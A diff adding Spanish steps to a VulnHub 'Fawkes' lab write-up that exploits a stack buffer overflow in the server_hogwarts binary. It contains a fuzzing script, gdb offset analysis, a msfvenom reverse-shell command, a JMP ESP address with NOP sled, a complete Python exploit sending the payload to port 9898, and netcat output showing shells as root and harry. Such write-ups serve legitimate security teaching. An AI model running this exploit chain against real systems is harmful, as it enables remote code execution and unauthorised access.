@@ -61,7 +61,14 @@ Herramientas utilizadas:
 			<ul>
 				<li><a href="#BufferOverflow">Proceso para Aplicar Buffer Overflow</a></li>
 				<ul>
-					<li><a href="#"></a></li>
+					<li><a href="#Confirmacion">Tercer Paso: Confirmando Buffer Overflow con gdb</a></li>
+					<li><a href="#fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</a></li>
+					<li><a href="#offset">Quinto Paso: Obteniendo el offset</a></li>
+					<li><a href="#identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</a></li>
+                                        <li><a href="#shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</a></li>
+                                        <li><a href="#OpCode">Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</a></li>
+					<li><a href="#NOPs">Noveno Paso: Aplicando NOPs en Exploit</a></li>
+                                        <li><a href="#Exploit">Decimo Paso: Prueba y Ejecución de Exploit</a></li>
 				</ul>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
@@ -475,11 +482,17 @@ Hemos crasheado el binario y obtuvimos el mensaje **segmentation fault**, que es
 
 Para que podamos aplicar **Buffer Overflow**, es necesario que conozcamos ciertos conceptos y pasos a seguir.
 
+Estos son los pasos que yo considero, son los que se deben aplicar para realizar un **Buffer Overflow**:
 * **Primero**: Identificar si un archivo encontrado es un binario.
 * **Segundo**: Estudiar y analizar su funcionamiento.
-* **Tercero**: Confirmar vulnerabilidad con herramienta **gdb**.
-* **Cuarto**: Identificar el **offset**.
-* **Quinto**: Creación y ejecución de payload en el binario.
+* **Tercer**: Confirmar vulnerabilidad con herramienta **gdb**.
+* **Cuarto**: Aplicar Fuzzing para detectar limites del binario.
+* **Quinto**: Identificar el **offset**.
+* **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
+* **Septimo**: Creación de Shellcode malicioso y creación de Exploit.
+* **Octavo**: Busqueda de **OpCode JMP ESP**.
+* **Noveno**: Aplicación de NOPs y/o desplazamiento de pila.
+* **Decimo**: Prueba y ejecución de Exploit.
 
 Aca te dejo unos links con buena información sobre **Buffer Overflow**:
 * <a href="https://keepcoding.io/blog/que-es-un-buffer-overflow/" target="_blank">¿Qué es un buffer overflow?</a>
@@ -490,23 +503,511 @@ Para este punto, ya hemos completado el punto 1 y 2, así que sigamos con los ot
 
 <br>
 
-<h3 id="">Confirmando Buffer Overflow con gdb</h3>
+<h3 id="Confirmacion">Tercer Paso: Confirmando Buffer Overflow con gdb</h3>
 
+En mi caso, segui esta guia para instalar la herramienta **gdb**:
+<a href="https://www.gdbtutorial.com/tutorial/how-install-gdb" target="_blank">Guide to use GDB and learn debugging techniques: How to Install GDB?</a>
+
+Y le instale la siguiente expansión para mejorar la herramienta **gdb**:
+<a href="https://github.com/hugsy/gef" target="_blank">Repositorio de hugsy: gef</a>
+
+Una vez que los tengas instalados, vamos a ejecutar **gdb** junto al binario:
+```bash
+gdb -q ./server_hogwarts
+```
+
+Hay muchos comandos que podemos usar dentro de **gdb** y aun más con la expansión que añadimos.
+
+Por ejemplo, podemos analizar la seguridad del binario con `checksec`:
+```bash
+gef➤  checksec
+[+] checksec for '/home/berserkwings/Desktop/VulnHub/Fawkes/content/server_hogwarts'
+Canary                        : ✓ (value: 0xf4fcd700)
+NX                            : ✘ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : ✘ 
+```
+Esto es otro indicativo de que el binario es bastante vulnerable a **Buffer Overflow**, ya que no tiene la suficiente seguridad.
+
+Investiguemos que es **Canary**.
+
+| **stack canary** |
+|:-----------:|
+| *Un stack canary es un valor especial que se coloca en la pila (stack) para detectar sobrescrituras. Esto significa que, si intentas sobrescribir datos en la pila, como el EIP, primero tendrías que evitar alterar su valor. Si el canario cambia, el programa detectará el ataque y terminará.* |
 
 <br>
 
-<h3 id=""></h3>
-
-
+Ahora, vayamos al siguiente paso.
 
 <br>
 
-<h3 id=""></h3>
+<h3 id="fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</h3>
+
+Esta parte es esencial para identificar los limites del binario o aplicación, introduciendo varias cantidades de caracteres hasta que falle.
+
+Esto ya lo hicimos, pero aquí te dejo un script de **Python** que puedes usar para introducir la cantidad de caracteres que quieras (este script puede servir para otros casos de **Buffer Overflow**, aunque depende de cada caso).
+
+El script lo llame **spiker.py**:
+```python
+#!/usr/bin/python3
+import socket
+import argparse
 
 
+def parse_arguments():
+        parser = argparse.ArgumentParser(description="Script para fuzzear monkeycom")
+        parser.add_argument("--ip_addr", required=True, help="Dirección IP a utilizar")
+        parser.add_argument("--port", type=int, required=True, help="Puerto a utilizar")
+        parser.add_argument("--length", type=int, required=True, help="Cantidad de A's a enviar")
+        return parser.parse_args()
 
 
-<h2 id=""></h2>
+def exploit(ip, port, length):
+        try:
+                # Creando conexión vía TCP/IP
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                print(f"\n[+] Conectando a {ip}:{port}...\n")
+                s.connect((ip, port))
+
+                # Recibiendo banner
+                banner = s.recv(1024)
+                print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")
+
+                # Creando y enviando payload
+                payload = b"A" * length + b'\r\n'
+                print(f"[*] Payload Enviado: {payload}\n")
+                s.send(payload)
+
+                # Recibiendo respuesta
+                response = s.recv(1024)
+                if response:
+                        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")
+                else:
+                        print(f"\n[!] Sin respuesta.")
+
+        # Manejo de errores
+        except socket.error as e:
+                print(f"[!] Error de conexión: {e}")
+
+        except Exception as e:
+                print(f"[!] Ocurrio un error: {e}")
+
+        # Cerrando la conexión
+	finally:
+                s.close()
+                print("\n[+] Cerrando conexión.")
+
+
+if __name__ == '__main__':
+        args = parse_arguments()
+        exploit(args.ip_addr, args.port, args.length)
+```
+Es muy simple su uso, debes indicarle la IP, el puerto y la cantidad de caracteres a enviar. Los caracteres que se van a enviar son **A's** solamente.
+
+Puedes probarlo contra el binario o hacerlo manualmente.
+
+Para ejecutar el binario, usamos solamente la letra **r**:
+```bash
+gef➤  r
+Starting program: ../Fawkes/content/server_hogwarts
+```
+
+Como ya esta iniciado, vamos a enviar el mismo payload de **200 A's** y observamos la respuesta que nos de **gdb**:
+```bash
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x41414141 ("AAAA"?)
+$ecx   : 0xffffce40  →  0x0000000a ("\n"?)
+$edx   : 0xffffcc84  →  0x0000000a ("\n"?)
+$esp   : 0xffffcc30  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x080b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd178  →  "\nEnter your spell: "
+$eip   : 0x41414141 ("AAAA"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcc30│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
+0xffffcc34│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc38│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc3c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc40│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc44│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc48│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffcc4c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x41414141
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+```
+Con **200 A's** es suficiente para que el binario deje de funcionar, pero pueden ser menos y es lo que debemos identificar.
+
+<br>
+
+<h3 id="offset">Quinto Paso: Obteniendo el offset</h3>
+
+Desde aquí, podemos identificar el **offset que es el número exacto de bytes que necesitas para sobrescribir el EIP**.
+
+Para esto, podemos generar un patron de distintos caracteres para que sea más facil identificar el **offset**.
+
+Desde **gdb**, usamos el comando **pattern create** para que nos de 1024 caracteres que podamos usar: 
+```bash
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=4)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa...
+```
+
+Ahora, ejecutamos el binario con **r** y enviamos los caracteres que tenemos:
+```bash
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffcbbc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$ebx   : 0x62616162 ("baab"?)
+$ecx   : 0xffffd180  →  "our spell: "
+$edx   : 0xffffcfc4  →  "our spell: "
+$esp   : 0xffffcc30  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
+$ebp   : 0x62616163 ("caab"?)
+$esi   : 0x080b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd178  →  "\nEnter your spell: "
+$eip   : 0x62616164 ("daab"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcc30│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"    ← $esp
+0xffffcc34│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
+0xffffcc38│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
+0xffffcc3c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
+0xffffcc40│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
+0xffffcc44│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
+0xffffcc48│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
+0xffffcc4c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x62616164
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+```
+Observa el **EIP**, se pueden ver letras especificas que podemos identificar de todo el payload.
+
+Lo podemos hacer manualmente de la siguiente manera:
+
+* Copia el payload y dentro de tu terminal, usalo dentro de **echo** y pipealo con **grep**, buscando las 4 letras que estan en el **EIP**:
+```bash
+echo -n "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..." | grep "daab"
+```
+
+* Ya identificado, copia hasta donde indico el comando anterior e igual usalo dentro de echo y pipealo con `wc -c`:
+```bash
+echo -n "aaaabaaacaaadaaaeaaafaa..." | wc -c
+116
+```
+Si quitamos los 4 caracteres que buscamos, seria un total de 112 el **offset**.
+
+También lo podemos hacer de forma sencilla con el comando `pattern offset $eip`:
+```bash
+gef➤  pattern offset $eip
+[+] Searching for '64616162'/'62616164' with period=4
+[+] Found at offset 112 (little-endian search) likely
+```
+Con eso, confirmamos la cantidad del **offset**.
+
+<br>
+
+<h3 id="identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</h3>
+
+Estos registros son los que nos importan, pues son los registros de CPU hacia los cuales se pueden dirigir el **Buffer Overflow**:
+* *EIP*: indica la siguiente dirección de memoria que el ordenador debería ejecutar.
+* *EAX*: almacena temporalmente cualquier dirección de retorno.
+* *EBX*: almacena datos y direcciones de memoria.
+* *ESI*: contiene la dirección de memoria de los datos de entrada.
+* *ESP*: se usa para referenciar el inicio de un hilo.
+* *EBP*: indica la dirección de memoria del final de un hilo.
+
+Más especificos, nos interesan estos dos: **EIṔ y EBP**.
+
+Podemos confirmar que después del **offset**, se reescribe el **EIP** y luego se escriben más caracteres. 
+
+Con **Python**, podemos generar varios caracteres para cumplir con el **offset**, sobreescribir el **EIP** y registrar n cantidad de caracteres después:
+```bash
+python3 -c 'print("A"*112 + "B"*4 + "C"*100)'
+```
+
+Con **gdb**, ejecuta el binario y manda el payload para ver la respuesta: 
+```bash
+[ Legend: Modified register | Code | Heap | Stack | String ]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x41414141 ("AAAA"?)
+$ecx   : 0xffffce50  →  0x0000000a ("\n"?)
+$edx   : 0xffffcc94  →  0x0000000a ("\n"?)
+$esp   : 0xffffcc30  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x080b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd178  →  "\nEnter your spell: "
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffcc30│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"    ← $esp
+0xffffcc34│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc38│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc3c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc40│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc44│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc48│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffcc4c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x42424242 in ?? (), reason: SIGSEGV
+────────────────────────────────────────────────────────────────────────────────────────
+```
+Excelente, observa que ahí estan las **4 B's** que creamos con el payload dentro del **EIP** y después quedan registradas las **C's**.
+
+Puedes ver que el **ESP** (el inicio de la pila) igual ya tiene las **C's**, lo que quiere decir que aquí es donde podemos meter el Shellcode.
+
+Además, podemos inspeccionar el **ESP** desde **gdb** para comprobar lo del **ESP**:
+```bash
+gef➤  x/35wx $esp-5
+0xffffcc2b:     0x42424241      0x43434342      0x43434343      0x43434343
+0xffffcc3b:     0x43434343      0x43434343      0x43434343      0x43434343
+0xffffcc4b:     0x43434343      0x43434343      0x43434343      0x43434343
+0xffffcc5b:     0x43434343      0x43434343      0x43434343      0x43434343
+0xffffcc6b:     0x43434343      0x43434343      0x43434343      0x43434343
+0xffffcc7b:     0x43434343      0x43434343      0x43434343      0x43434343
+0xffffcc8b:     0x43434343      0x43434343      0x00000a43      0x00000000
+0xffffcc9b:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffffccab:     0x6c655700      0x656d6f63      0x206f7420
+```
+Con esto comprobamos que el **EIP** empieza con las **B's** y luego comienza el **ESP** que vale las **C's**
+
+<br>
+
+<h3 id="shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</h3>
+
+Vamos muy bien, ahora podemos comenzar a crear nuestro Exploit en **Python**.
+
+Primero crearemos el Shellcode que será una **Reverse Shell** con **msfvenom**.
+
+Puedes crearlo para probarlo contra tu máquina o de una vez hacerlo para atacar el binario de la máquina víctima, pero en mi caso, lo hare para mi máquina:
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=Tu_IP LPORT=443 -b "\x00" -f py -v shellcode
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of py file: 550 bytes
+shellcode =  b""
+shellcode += b"\xdb\...
+...
+...
+```
+Le indicamos a **msfvenom** lo siguiente:
+* Crear una **Reverse Shell** para **arquitectura x86**.
+* Mi IP y un puerto al que será dirigido.
+* Que elimine el byte nulo (\x00), ya que puede darnos conflicto con el binario, pues esta hecho con **lenguaje C**.
+* Crear el formato del payload en **Python**
+* Especificamos el nombre de la variable que almacena el payload como **shellcode**.
+
+Ahora, empezamos a crear nuestro Exploit con **Python**, siendo muy similar al script **spiker.py**:
+```python
+#!/usr/bin/python3
+
+import socket
+
+# Variables globales
+ip_addr = "127.0.0.1 o VíctimaIP"
+port = 9898
+offset = 112
+before_eip = b"A"*offset
+eip = b"B"*4
+
+shellcode =  b""
+shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
+...
+...
+...
+
+after_eip = shellcode
+
+# Creando conexión y enviando shellcode
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((ip_addr, port))
+s.send(payload)
+s.close()
+```
+Así va quedando nuestro script, pero aun faltan cosas por completar en los siguientes pasos.
+
+<br>
+
+<h3 id="OpCode">Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</h3>
+
+¿Qué es un **OpCode**?
+
+| **Operation Code** |
+|:-----------:|
+| *El opcode (abreviatura de "operation code" o código de operación) es una parte fundamental de una instrucción en lenguaje máquina. Es el segmento de la instrucción que le dice a la CPU qué operación debe realizar.* |
+
+<br>
+
+Entonces, necesitamos buscar un **OpCode** donde se aplicara nuestro **Shellcode** para obtener la **Reverse Shell**.
+
+Para esto, usamos el **EIP** para que apunte a una dirección de memoria donde se este aplique un **OpCode**, para que realice un salto (**JMP**) al **ESP**, que es donde queremos que se aplique el shellcode. Esto se le conoce como **JMP ESP**
+
+Una herramienta que podemos ocupar es **nasm_shell** de **Metasploit Framework**.
+
+Podemos invocarla usando su ruta completa `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` y le indicamos que busque el `JMP ESP`:
+```bash
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp ESP
+00000000  FFE4              jmp esp
+```
+El **OpCode** se representa así: `\xFF\xE4`.
+
+Ahora, podemos buscarlo dentro del binario con la herramienta **objdump** y con **grep** buscamos el **OpCode**:
+```bash
+objdump -D server_hogwarts| grep "ff e4"
+ 8049d55:       ff e4                   jmp    *%esp
+ 80b322c:       81 73 f6 ff e4 73 f6    xorl   $0xf673e4ff,-0xa(%ebx)
+ 80b3253:       ff 91 73 f6 ff e4       call   *-0x1b00098d(%ecx)
+ 80b500f:       ff e4                   jmp    *%esp
+ 80b51ef:       ff e4                   jmp    *%esp
+ 80b546f:       ff e4                   jmp    *%esp
+ 80d0717:       ff e4                   jmp    *%esp
+```
+Se puede ocupar cualquiera que sea **JMP ESP**.
+
+Lo puedes agregar de una vez al Exploit, pero el **OpCode** debe ir en formato **Little Endian** que básicamente es ponerlo de atras hacia adelante de la siguiente forma:
+```bash
+\x55\x9d\x04\x08 -> JMP ESP 8049d55
+```
+
+Se agregaria en la variable **eip**:
+```python
+eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55
+```
+
+Vayamos al siguiente paso.
+
+<br>
+
+<h3 id="NOPs">Noveno Paso: Aplicando NOPs en Exploit</h3>
+
+¿Qué son los **NOPs**?
+
+| **No Operation (NOPs)** |
+|:-----------:|
+| *Los NOPs (del inglés No Operation, "sin operación") son instrucciones en lenguaje máquina o ensamblador que no realizan ninguna acción útil, excepto avanzar al siguiente ciclo de la CPU. Permiten que el procesador tenga tiempo adicional para interpretar el shellcode antes de continuar con la siguiente instrucción del programa.* |
+
+<br>
+
+Es muy simple, únicamente debemos agregar la siguiente instrucción que es para **arquitectura x86**:
+```bash
+b"\x90"
+```
+El **NOP**, se puede multiplicar por 16 o por 32, pero en nuestro caso, al no tener tantas instrucciones, podemos multiplicarlo por 16.
+
+Esto lo podemos agregar al Exploit en la variable **after_eip** junto al **Shellcode**:
+```python
+after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode
+```
+Sigamos.
+
+<br>
+
+<h3 id="Exploit">Decimo Paso: Prueba y Ejecución de Exploit</h3>
+
+Con lo datos que ya hemos obtenido, nuestro Exploit debería quedar así:
+```python
+#!/usr/bin/python3
+
+import socket
+
+# Variables globales
+ip_addr = "127.0.0.1 o VíctimaIP"
+port = 9898
+
+def exploit(ip_addr, port):
+
+        offset = 112
+
+        before_eip = b"A" * offset  # Limite de binario
+
+        eip = b"\x55\x9d\x04\x08"  # OpCode JMP ESP 8049d55
+
+        shellcode =  b""
+        shellcode += b"\xdb\xda\xbd\xba\xee\x62\x1...
+	...
+	...
+	...
+
+        after_eip = b"\x90"*16 + shellcode  # ESP = Combinación de NOPs con shellcode
+
+        payload = before_eip + eip + after_eip
+
+        try:
+                # Creando conexión y enviando shellcode
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                print(f"\n[+] Conectando a {ip_addr}:{port}...\n")
+                s.connect((ip_addr, port))
+
+                # Enviando payload
+                s.send(payload)
+                print(f"\n[*] Payload lanzado: {payload}")
+
+        # Manejo de errores
+        except socket.error as e:
+                print(f"[!] Error de conexión: {e}")
+
+        except Exception as e:
+                print(f"[!] Ocurrio un error: {e}")
+
+        # Cerrando la conexión
+        finally:
+                s.close()
+                print("\n[+] Cerrando conexión.")
+
+
+if __name__ == '__main__':
+        exploit(ip_addr, port)
+```
+Lo estructure mejor para que maneje errores como el **spiker.py**.
+
+Ahora, podemos probarlo con nuestra máquina, aunque debo decir que debe ser ejecutado varias veces para poder obtener una shell.
+
+Abre una **netcat** y ejecuta el Exploit hasta obtener la shell:
+```bash
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [Tu_IP] 40950
+whoami
+root
+ls
+exploitMonkeycom.py
+server_hogwarts
+spiker.py
+```
+
+Igual podemos probarlo directamente con la máquina víctima, si es que pusiste su IP en el script.
+
+Abre una **netcat** y ejecuta el Exploit:
+```bash
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [Tu_IP] from (UNKNOWN) [192.168.1.007] 34188
+whoami
+harry
+```
+Con esto, hemos ejecutado un **Buffer Overflow** exitosamente.
 
 
 <br>
